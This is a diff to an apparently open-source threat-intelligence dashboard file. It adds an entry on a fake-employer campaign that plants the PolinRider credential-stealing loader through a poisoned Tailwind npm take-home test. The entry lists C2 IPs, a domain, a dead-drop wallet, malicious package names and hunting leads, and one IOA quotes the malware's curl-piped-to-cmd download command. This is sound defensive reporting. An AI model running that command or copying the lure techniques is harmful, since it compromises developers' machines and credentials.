@@ -4,10 +4,10 @@
  "repository": "https://github.com/daniyyell-dev/rapid-threat-intel",
  "documentation": "https://github.com/daniyyell-dev/rapid-threat-intel/blob/main/docs/dashboard.md",
  "licence": "MIT",
- "last_updated": "2026-11-14 01:25",
- "threat_count": 57,
- "indicator_count": 1586,
- "block_now_count": 710,
+ "last_updated": "2026-11-14 04:14",
+ "threat_count": 58,
+ "indicator_count": 1596,
+ "block_now_count": 719,
  "combined_files": [
   {
    "name": "block_now.txt",
@@ -102,6 +102,488 @@
   }
  ],
  "threats": [
+  {
+   "id": "Contagious-Interview-AccuraSoftHire-PolinRider-npm-Developer-Lure",
+   "folder": "threats/2026-11_November-2026/2026-11-14/Contagious-Interview-AccuraSoftHire-PolinRider-npm-Developer-Lure",
+   "name": "Contagious Interview: AccuraSoftHire Fake Employer Plants PolinRider Loader on Developer Machines",
+   "short": "AccuraSoftHire PolinRider loader",
+   "category": "Nation-state / social engineering",
+   "published": "2026-11-09",
+   "entry_date": "2026-11-14 04:14",
+   "last_updated": "2026-11-14",
+   "seq": 58,
+   "headline": "Fake employer AccuraSoftHire gives developers a poisoned Tailwind take-home that installs the PolinRider credential-stealing loader",
+   "summary": "JFrog Security Research reported on 9 November 2026 that a fake company, AccuraSoftHire, with a careers site, Indeed and Glassdoor job ads, ID-verified LinkedIn recruiters and GitHub accounts, gives software engineers a take-home React test whose Tailwind config loads a trojanised look-alike plugin such as tailwind-custom-forms. The loader runs when Tailwind builds the CSS, not at npm install. Candidates are also pushed a fake camera driver and a job-alerts browser extension from the site. The loader, which researchers track as PolinRider, reads the newest transaction from Ethereum wallet 0xa322E5f3D311D3080e6f0121063e9aDC2490Ef1a, decodes the C2 address from it and fetches two stages over plain HTTP on port 443 from /0x/cls and /0x/ls. StepSecurity decoded all 609 wallet transactions (July to 19 October 2026) into eight C2 addresses, and reports the malware steals browser, wallet, SSH, cloud and git credentials and injects itself into the victim's other repositories. The tradecraft matches North Korea-linked Contagious Interview, the same lure Binance says began its 29 October theft of about $6.34 billion, though JFrog found no link between AccuraSoftHire and that intrusion. The careers domain and all eight C2 addresses are on the block list.",
+   "caveat": "Attribution to North Korea rests on shared tradecraft and markers with PolinRider and ClickFake, not on a confirmed link; JFrog found no tie to the Binance intrusion. The wallet has posted no new address since 19 October 2026, so a loader running today would still contact 103.179.142.155; if the operator moves to a new wallet, new addresses will not appear here. The npm package names, account names and email addresses in the report are not network indicators and are covered in the actions.",
+   "targets": {
+    "countries": [],
+    "regions": [
+     "Worldwide"
+    ],
+    "sectors": [
+     "Software development",
+     "Cryptocurrency"
+    ],
+    "note": "Fake job interviews aimed at software engineers and their employers' credentials; the reports cite the same lure in the Binance theft and name no target countries.",
+    "source": {
+     "url": "https://research.jfrog.com/post/accurasofthire-fake-interview/",
+     "label": "JFrog Security Research – Contagious Interview: One Interview Away From Infection",
+     "name": "JFrog Security Research"
+    }
+   },
+   "mitre": [
+    {
+     "id": "T1566.003",
+     "name": "Phishing: Spearphishing via Service",
+     "url": "https://attack.mitre.org/techniques/T1566/003/"
+    },
+    {
+     "id": "T1195.001",
+     "name": "Supply Chain Compromise: Compromise Software Dependencies and Development Tools",
+     "url": "https://attack.mitre.org/techniques/T1195/001/"
+    },
+    {
+     "id": "T1204.002",
+     "name": "User Execution: Malicious File",
+     "url": "https://attack.mitre.org/techniques/T1204/002/"
+    },
+    {
+     "id": "T1102.001",
+     "name": "Web Service: Dead Drop Resolver",
+     "url": "https://attack.mitre.org/techniques/T1102/001/"
+    },
+    {
+     "id": "T1071.001",
+     "name": "Application Layer Protocol: Web Protocols",
+     "url": "https://attack.mitre.org/techniques/T1071/001/"
+    },
+    {
+     "id": "T1176",
+     "name": "Browser Extensions",
+     "url": "https://attack.mitre.org/techniques/T1176/"
+    },
+    {
+     "id": "T1555.003",
+     "name": "Credentials from Web Browsers",
+     "url": "https://attack.mitre.org/techniques/T1555/003/"
+    },
+    {
+     "id": "T1552.001",
+     "name": "Unsecured Credentials: Credentials In Files",
+     "url": "https://attack.mitre.org/techniques/T1552/001/"
+    }
+   ],
+   "recommended_actions": [
+    "Block accurasofthire.com and the eight C2 addresses at the proxy and firewall, and search 90 days of proxy, DNS and firewall logs for them, for any request to /0x/cls or /0x/ls, and for a Sec-V request header.",
+    "Search developer machines and project folders for the npm packages tailwind-custom-forms, tailwindcss-contact-forms, tailwind-form-styles, tailwind-forms-kit, tailwind-lines-clamps, tailwind-clamps-line, tailwind-lineclamp, scrollbar-hide-plugin, tailwindcss-anim and tailwind-anim, for .vscode/tasks.json files with \"runOn\": \"folderOpen\", and for a browser extension loaded from a folder named job-new-alerts.",
+    "If a machine matches, treat every credential on it as stolen: rotate git, SSH, cloud, npm and browser-stored credentials, and review the developer's repositories for loader code added under backdated commits.",
+    "Set VS Code task.allowAutomaticTasks to off, keep Workspace Trust on, and make it policy that interview assignments, drivers and setup commands from outside the company never run on work machines."
+   ],
+   "sources": [
+    {
+     "url": "https://research.jfrog.com/post/accurasofthire-fake-interview/",
+     "label": "JFrog Security Research – Contagious Interview: One Interview Away From Infection",
+     "name": "JFrog Security Research"
+    },
+    {
+     "url": "https://www.stepsecurity.io/blog/accurasofthire-fake-interview-developer-machines",
+     "label": "StepSecurity – Inside the AccuraSoftHire fake interview campaign",
+     "name": "StepSecurity"
+    },
+    {
+     "url": "https://threatfox.abuse.ch/ioc/1971739/",
+     "label": "ThreatFox – 103.179.142.155:443 loader C2 (IOC 1971739)",
+     "name": "ThreatFox"
+    },
+    {
+     "url": "https://threatfox.abuse.ch/ioc/1967882/",
+     "label": "ThreatFox – 23.27.13.72:443 loader C2 (IOC 1967882)",
+     "name": "ThreatFox (2)"
+    },
+    {
+     "url": "https://threatfox.abuse.ch/ioc/2018861/",
+     "label": "ThreatFox – 91.218.183.174:443 loader C2 (IOC 2018861)",
+     "name": "ThreatFox (3)"
+    },
+    {
+     "url": "https://threatfox.abuse.ch/ioc/1926649/",
+     "label": "ThreatFox – 166.88.134.75:443 loader C2 (IOC 1926649)",
+     "name": "ThreatFox (4)"
+    },
+    {
+     "url": "https://threatfox.abuse.ch/ioc/2018860/",
+     "label": "ThreatFox – 193.247.144.38:443 loader C2 (IOC 2018860)",
+     "name": "ThreatFox (5)"
+    },
+    {
+     "url": "https://threatfox.abuse.ch/ioc/2018859/",
+     "label": "ThreatFox – 166.88.73.46:443 loader C2 (IOC 2018859)",
+     "name": "ThreatFox (6)"
+    },
+    {
+     "url": "https://threatfox.abuse.ch/ioc/2018858/",
+     "label": "ThreatFox – 23.27.13.135:443 loader C2 (IOC 2018858)",
+     "name": "ThreatFox (7)"
+    },
+    {
+     "url": "https://threatfox.abuse.ch/ioc/2018857/",
+     "label": "ThreatFox – 166.88.134.62:443 loader C2 (IOC 2018857)",
+     "name": "ThreatFox (8)"
+    },
+    {
+     "url": "https://urlhaus.abuse.ch/host/91.218.183.174/",
+     "label": "urlhaus.abuse.ch",
+     "name": "URLhaus"
+    },
+    {
+     "url": "https://urlhaus.abuse.ch/host/166.88.134.75/",
+     "label": "urlhaus.abuse.ch",
+     "name": "URLhaus (2)"
+    },
+    {
+     "url": "https://urlhaus.abuse.ch/host/166.88.134.62/",
+     "label": "urlhaus.abuse.ch",
+     "name": "URLhaus (3)"
+    }
+   ],
+   "indicator_count": 10,
+   "block_now_count": 9,
+   "hunt_count": 1,
+   "hunt_counts": {
+    "monitor": 1
+   },
+   "indicator_counts": {
+    "ipv4": 8,
+    "domain": 1,
+    "eth_address": 1
+   },
+   "ioas": [
+    {
+     "artefact": "Node.js reading the Ethereum block explorer eth.blockscout.com, then connecting to a bare public IP on port 443 within five minutes",
+     "log_source": "Defender XDR DeviceNetworkEvents; proxy and firewall logs",
+     "why": "JFrog and StepSecurity show the PolinRider loader running inside a Tailwind build (node) and querying the operator's wallet history through eth.blockscout.com, then fetching /0x/cls and /0x/ls over plain HTTP on port 443 from the decoded IP, with no hostname. StepSecurity names these two connections as ones a frontend build would not normally make. The hunt only fires when the same device does both within five minutes, which a normal frontend build never does. Expected false positives are developers who build Web3 dApps or wallet tooling and call a raw-IP RPC node; review the node command line and the destination, and exclude known internal Web3 projects by path.",
+     "action": "hunt",
+     "has_query": true,
+     "source_url": "https://www.stepsecurity.io/blog/accurasofthire-fake-interview-developer-machines",
+     "source_name": "StepSecurity",
+     "title": "Node.js reads the Ethereum dead drop, then calls a bare IP on 443",
+     "queries": [
+      "KQL"
+     ]
+    },
+    {
+     "artefact": "Native messaging host com.accurasoft.jobalerts registered for Chrome or Edge, or bootstrap.cmd written under %USERPROFILE%\\.nvm",
+     "log_source": "Defender XDR DeviceRegistryEvents and DeviceFileEvents; Windows Registry and file auditing",
+     "why": "JFrog found the site's job-alerts setup script registers a native messaging host named com.accurasoft.jobalerts for Chrome and Edge in the user's registry, whose only extra job is to run curl http://accurasofthire.com/notification-settings-win?download=1 | cmd. That batch file creates a .nvm folder in the user profile and starts notification-bootstrap-win as bootstrap.cmd, hidden. Neither name belongs to legitimate software (nvm-windows keeps its files under AppData\\Roaming\\nvm and has no bootstrap.cmd), so expected false positives are close to none.",
+     "action": "alert",
+     "has_query": true,
+     "source_url": "https://research.jfrog.com/post/accurasofthire-fake-interview/",
+     "source_name": "JFrog Security Research",
+     "title": "com.accurasoft.jobalerts native host or .nvm\\bootstrap.cmd",
+     "queries": [
+      "KQL",
+      "SPL",
+      "YARA-L"
+     ]
+    }
+   ],
+   "ioa_count": 2,
+   "ioa_note": "Behaviours are leads, not confirmed indicators, and can match legitimate activity. Compare any hit against your own baseline and environment before acting.",
+   "files": [
+    {
+     "name": "block_now.txt",
+     "label": "Block list",
+     "url": "https://raw.githubusercontent.com/daniyyell-dev/rapid-threat-intel/main/threats/2026-11_November-2026/2026-11-14/Contagious-Interview-AccuraSoftHire-PolinRider-npm-Developer-Lure/block_now.txt",
+     "download": "Contagious-Interview-AccuraSoftHire-PolinRider-npm-Developer-Lure_block_now.txt"
+    },
+    {
+     "name": "defender_xdr_indicators.csv",
+     "label": "Defender XDR import",
+     "url": "https://raw.githubusercontent.com/daniyyell-dev/rapid-threat-intel/main/threats/2026-11_November-2026/2026-11-14/Contagious-Interview-AccuraSoftHire-PolinRider-npm-Developer-Lure/defender_xdr_indicators.csv",
+     "download": "Contagious-Interview-AccuraSoftHire-PolinRider-npm-Developer-Lure_defender_xdr_indicators.csv"
+    },
+    {
+     "name": "hunt.kql",
+     "label": "Hunting query (KQL)",
+     "url": "https://raw.githubusercontent.com/daniyyell-dev/rapid-threat-intel/main/threats/2026-11_November-2026/2026-11-14/Contagious-Interview-AccuraSoftHire-PolinRider-npm-Developer-Lure/hunt.kql",
+     "download": "Contagious-Interview-AccuraSoftHire-PolinRider-npm-Developer-Lure_hunt.kql"
+    },
+    {
+     "name": "hunt.spl",
+     "label": "Hunting query (SPL)",
+     "url": "https://raw.githubusercontent.com/daniyyell-dev/rapid-threat-intel/main/threats/2026-11_November-2026/2026-11-14/Contagious-Interview-AccuraSoftHire-PolinRider-npm-Developer-Lure/hunt.spl",
+     "download": "Contagious-Interview-AccuraSoftHire-PolinRider-npm-Developer-Lure_hunt.spl"
+    },
+    {
+     "name": "hunt_raw.spl",
+     "label": "Hunting query (SPL, raw events)",
+     "note": "hunt_raw.spl, for data not mapped to CIM",
+     "url": "https://raw.githubusercontent.com/daniyyell-dev/rapid-threat-intel/main/threats/2026-11_November-2026/2026-11-14/Contagious-Interview-AccuraSoftHire-PolinRider-npm-Developer-Lure/hunt_raw.spl",
+     "download": "Contagious-Interview-AccuraSoftHire-PolinRider-npm-Developer-Lure_hunt_raw.spl"
+    },
+    {
+     "name": "hunt.yaral",
+     "label": "Hunting query (YARA-L 2.0)",
+     "url": "https://raw.githubusercontent.com/daniyyell-dev/rapid-threat-intel/main/threats/2026-11_November-2026/2026-11-14/Contagious-Interview-AccuraSoftHire-PolinRider-npm-Developer-Lure/hunt.yaral",
+     "download": "Contagious-Interview-AccuraSoftHire-PolinRider-npm-Developer-Lure_hunt.yaral"
+    },
+    {
+     "name": "iocs.csv",
+     "label": "All indicators (CSV)",
+     "url": "https://raw.githubusercontent.com/daniyyell-dev/rapid-threat-intel/main/threats/2026-11_November-2026/2026-11-14/Contagious-Interview-AccuraSoftHire-PolinRider-npm-Developer-Lure/iocs.csv",
+     "download": "Contagious-Interview-AccuraSoftHire-PolinRider-npm-Developer-Lure_iocs.csv"
+    }
+   ],
+   "repo_url": "https://github.com/daniyyell-dev/rapid-threat-intel/tree/main/threats/2026-11_November-2026/2026-11-14/Contagious-Interview-AccuraSoftHire-PolinRider-npm-Developer-Lure",
+   "share_url": "https://daniyyell.com/rapid-threat-intel/t/Contagious-Interview-AccuraSoftHire-PolinRider-npm-Developer-Lure/",
+   "indicators": [
+    {
+     "value": "accurasofthire.com",
+     "type": "domain",
+     "confidence": "high",
+     "recommended_action": "block",
+     "description": "Fake AccuraSoftHire careers site that serves the PolinRider loader to job candidates as a camera driver, VS Code setup and notification-settings download.",
+     "source_url": "https://research.jfrog.com/post/accurasofthire-fake-interview/",
+     "source_label": "JFrog Security Research – Contagious Interview: One Interview Away From Infection",
+     "source_name": "JFrog Security Research",
+     "sources": [
+      {
+       "url": "https://research.jfrog.com/post/accurasofthire-fake-interview/",
+       "name": "JFrog Security Research"
+      },
+      {
+       "url": "https://www.stepsecurity.io/blog/accurasofthire-fake-interview-developer-machines",
+       "name": "StepSecurity"
+      }
+     ]
+    },
+    {
+     "value": "103.179.142.155",
+     "type": "ipv4",
+     "confidence": "high",
+     "recommended_action": "block",
+     "description": "PolinRider loader C2 that the camera-driver payload was pointed at, decoded from the operator's Ethereum dead-drop wallet; serves stages from /0x/cls and /0x/ls over plain HTTP on port 443.",
+     "source_url": "https://www.stepsecurity.io/blog/accurasofthire-fake-interview-developer-machines",
+     "source_label": "StepSecurity – Inside the AccuraSoftHire fake interview campaign",
+     "source_name": "StepSecurity",
+     "sources": [
+      {
+       "url": "https://www.stepsecurity.io/blog/accurasofthire-fake-interview-developer-machines",
+       "name": "StepSecurity"
+      },
+      {
+       "url": "https://research.jfrog.com/post/accurasofthire-fake-interview/",
+       "name": "JFrog Security Research"
+      },
+      {
+       "url": "https://threatfox.abuse.ch/ioc/1971739/",
+       "name": "ThreatFox"
+      }
+     ]
+    },
+    {
+     "value": "23.27.13.72",
+     "type": "ipv4",
+     "confidence": "high",
+     "recommended_action": "block",
+     "description": "PolinRider loader C2 decoded from the operator's Ethereum dead-drop wallet (posted 14 Oct 2026); serves stages from /0x/cls and /0x/ls over plain HTTP on port 443.",
+     "source_url": "https://www.stepsecurity.io/blog/accurasofthire-fake-interview-developer-machines",
+     "source_label": "StepSecurity – Inside the AccuraSoftHire fake interview campaign",
+     "source_name": "StepSecurity",
+     "sources": [
+      {
+       "url": "https://www.stepsecurity.io/blog/accurasofthire-fake-interview-developer-machines",
+       "name": "StepSecurity"
+      },
+      {
+       "url": "https://threatfox.abuse.ch/ioc/1967882/",
+       "name": "ThreatFox"
+      }
+     ]
+    },
+    {
+     "value": "91.218.183.174",
+     "type": "ipv4",
+     "confidence": "high",
+     "recommended_action": "block",
+     "description": "PolinRider loader C2 decoded from the operator's Ethereum dead-drop wallet (posted 28 Sep-6 Oct 2026); serves stages from /0x/cls and /0x/ls over plain HTTP on port 443.",
+     "source_url": "https://www.stepsecurity.io/blog/accurasofthire-fake-interview-developer-machines",
+     "source_label": "StepSecurity – Inside the AccuraSoftHire fake interview campaign",
+     "source_name": "StepSecurity",
+     "sources": [
+      {
+       "url": "https://www.stepsecurity.io/blog/accurasofthire-fake-interview-developer-machines",
+       "name": "StepSecurity"
+      },
+      {
+       "url": "https://threatfox.abuse.ch/ioc/2018861/",
+       "name": "ThreatFox"
+      },
+      {
+       "url": "https://urlhaus.abuse.ch/host/91.218.183.174/",
+       "name": "URLhaus"
+      }
+     ]
+    },
+    {
+     "value": "166.88.134.75",
+     "type": "ipv4",
+     "confidence": "high",
+     "recommended_action": "block",
+     "description": "PolinRider loader C2 decoded from the operator's Ethereum dead-drop wallet (posted 17-28 Sep 2026); serves stages from /0x/cls and /0x/ls over plain HTTP on port 443.",
+     "source_url": "https://www.stepsecurity.io/blog/accurasofthire-fake-interview-developer-machines",
+     "source_label": "StepSecurity – Inside the AccuraSoftHire fake interview campaign",
+     "source_name": "StepSecurity",
+     "sources": [
+      {
+       "url": "https://www.stepsecurity.io/blog/accurasofthire-fake-interview-developer-machines",
+       "name": "StepSecurity"
+      },
+      {
+       "url": "https://threatfox.abuse.ch/ioc/1926649/",
+       "name": "ThreatFox"
+      },
+      {
+       "url": "https://urlhaus.abuse.ch/host/166.88.134.75/",
+       "name": "URLhaus"
+      }
+     ]
+    },
+    {
+     "value": "193.247.144.38",
+     "type": "ipv4",
+     "confidence": "high",
+     "recommended_action": "block",
+     "description": "PolinRider loader C2 decoded from the operator's Ethereum dead-drop wallet (posted 4 Sep-13 Oct 2026); serves stages from /0x/cls and /0x/ls over plain HTTP on port 443.",
+     "source_url": "https://www.stepsecurity.io/blog/accurasofthire-fake-interview-developer-machines",
+     "source_label": "StepSecurity – Inside the AccuraSoftHire fake interview campaign",
+     "source_name": "StepSecurity",
+     "sources": [
+      {
+       "url": "https://www.stepsecurity.io/blog/accurasofthire-fake-interview-developer-machines",
+       "name": "StepSecurity"
+      },
+      {
+       "url": "https://threatfox.abuse.ch/ioc/2018860/",
+       "name": "ThreatFox"
+      }
+     ]
+    },
+    {
+     "value": "166.88.73.46",
+     "type": "ipv4",
+     "confidence": "high",
+     "recommended_action": "block",
+     "description": "PolinRider loader C2 decoded from the operator's Ethereum dead-drop wallet (posted 28 Aug-3 Sep 2026); serves stages from /0x/cls and /0x/ls over plain HTTP on port 443.",
+     "source_url": "https://www.stepsecurity.io/blog/accurasofthire-fake-interview-developer-machines",
+     "source_label": "StepSecurity – Inside the AccuraSoftHire fake interview campaign",
+     "source_name": "StepSecurity",
+     "sources": [
+      {
+       "url": "https://www.stepsecurity.io/blog/accurasofthire-fake-interview-developer-machines",
+       "name": "StepSecurity"
+      },
+      {
+       "url": "https://threatfox.abuse.ch/ioc/2018859/",
+       "name": "ThreatFox"
+      }
+     ]
+    },
+    {
+     "value": "23.27.13.135",
+     "type": "ipv4",
+     "confidence": "high",
+     "recommended_action": "block",
+     "description": "PolinRider loader C2 decoded from the operator's Ethereum dead-drop wallet (posted 22-27 Aug 2026); serves stages from /0x/cls and /0x/ls over plain HTTP on port 443.",
+     "source_url": "https://www.stepsecurity.io/blog/accurasofthire-fake-interview-developer-machines",
+     "source_label": "StepSecurity – Inside the AccuraSoftHire fake interview campaign",
+     "source_name": "StepSecurity",
+     "sources": [
+      {
+       "url": "https://www.stepsecurity.io/blog/accurasofthire-fake-interview-developer-machines",
+       "name": "StepSecurity"
+      },
+      {
+       "url": "https://threatfox.abuse.ch/ioc/2018858/",
+       "name": "ThreatFox"
+      }
+     ]
+    },
+    {
+     "value": "166.88.134.62",
+     "type": "ipv4",
+     "confidence": "high",
+     "recommended_action": "block",
+     "description": "PolinRider loader C2 decoded from the operator's Ethereum dead-drop wallet (posted 25 Jul-22 Aug 2026); serves stages from /0x/cls and /0x/ls over plain HTTP on port 443.",
+     "source_url": "https://www.stepsecurity.io/blog/accurasofthire-fake-interview-developer-machines",
+     "source_label": "StepSecurity – Inside the AccuraSoftHire fake interview campaign",
+     "source_name": "StepSecurity",
+     "sources": [
+      {
+       "url": "https://www.stepsecurity.io/blog/accurasofthire-fake-interview-developer-machines",
+       "name": "StepSecurity"
+      },
+      {
+       "url": "https://threatfox.abuse.ch/ioc/2018857/",
+       "name": "ThreatFox"
+      },
+      {
+       "url": "https://urlhaus.abuse.ch/host/166.88.134.62/",
+       "name": "URLhaus"
+      }
+     ]
+    },
+    {
+     "value": "0xa322E5f3D311D3080e6f0121063e9aDC2490Ef1a",
+     "type": "eth_address",
+     "confidence": "high",
+     "recommended_action": "monitor",
+     "description": "Ethereum wallet whose newest transaction tells the PolinRider loader which C2 address to contact (NullReceiver dead drop).",
+     "source_url": "https://research.jfrog.com/post/accurasofthire-fake-interview/",
+     "source_label": "JFrog Security Research – Contagious Interview: One Interview Away From Infection",
+     "source_name": "JFrog Security Research",
+     "sources": [
+      {
+       "url": "https://research.jfrog.com/post/accurasofthire-fake-interview/",
+       "name": "JFrog Security Research"
+      },
+      {
+       "url": "https://www.stepsecurity.io/blog/accurasofthire-fake-interview-developer-machines",
+       "name": "StepSecurity"
+      }
+     ]
+    }
+   ],
+   "queries": [
+    {
+     "platform": "Defender XDR",
+     "language": "KQL",
+     "name": "hunt.kql",
+     "url": "https://raw.githubusercontent.com/daniyyell-dev/rapid-threat-intel/main/threats/2026-11_November-2026/2026-11-14/Contagious-Interview-AccuraSoftHire-PolinRider-npm-Developer-Lure/hunt.kql",
+     "download": "Contagious-Interview-AccuraSoftHire-PolinRider-npm-Developer-Lure_hunt.kql"
+    },
+    {
+     "platform": "Splunk",
+     "language": "SPL",
+     "name": "hunt.spl",
+     "url": "https://raw.githubusercontent.com/daniyyell-dev/rapid-threat-intel/main/threats/2026-11_November-2026/2026-11-14/Contagious-Interview-AccuraSoftHire-PolinRider-npm-Developer-Lure/hunt.spl",
+     "download": "Contagious-Interview-AccuraSoftHire-PolinRider-npm-Developer-Lure_hunt.spl",
+     "alt": {
+      "label": "No CIM? Raw-search version",
+      "name": "hunt_raw.spl",
+      "url": "https://raw.githubusercontent.com/daniyyell-dev/rapid-threat-intel/main/threats/2026-11_November-2026/2026-11-14/Contagious-Interview-AccuraSoftHire-PolinRider-npm-Developer-Lure/hunt_raw.spl",
+      "download": "Contagious-Interview-AccuraSoftHire-PolinRider-npm-Developer-Lure_hunt_raw.spl"
+     }
+    },
+    {
+     "platform": "Google SecOps",
+     "language": "YARA-L 2.0",
+     "name": "hunt.yaral",
+     "url": "https://raw.githubusercontent.com/daniyyell-dev/rapid-threat-intel/main/threats/2026-11_November-2026/2026-11-14/Contagious-Interview-AccuraSoftHire-PolinRider-npm-Developer-Lure/hunt.yaral",
+     "download": "Contagious-Interview-AccuraSoftHire-PolinRider-npm-Developer-Lure_hunt.yaral"
+    }
+   ]
+  },
   {
    "id": "ScreenConnect-Fake-Crypto-Exchange-Guest-Sessions-MSP-Bait",
    "folder": "threats/2026-11_November-2026/2026-11-14/ScreenConnect-Fake-Crypto-Exchange-Guest-Sessions-MSP-Bait",
